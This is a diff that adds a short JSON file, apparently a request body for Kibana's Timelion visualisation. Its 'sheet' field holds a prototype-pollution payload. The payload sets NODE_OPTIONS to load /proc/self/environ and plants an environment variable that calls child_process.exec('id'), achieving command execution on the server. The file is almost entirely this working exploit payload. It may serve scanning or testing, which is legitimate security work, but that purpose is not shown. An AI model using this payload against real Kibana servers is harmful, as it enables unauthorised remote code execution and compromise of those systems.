@@ -1,0 +1,10 @@
+{
+  "sheet": [
+    ".es(*).props(label.__proto__.env.NODE_OPTIONS=\"--require /proc/self/environ\").props(label.__proto__.env.AAAA=\"require('child_process').exec('id')\")"
+  ],
+  "time": {
+    "from": "now-15m",
+    "to": "now",
+    "interval": "auto"
+  }
+}
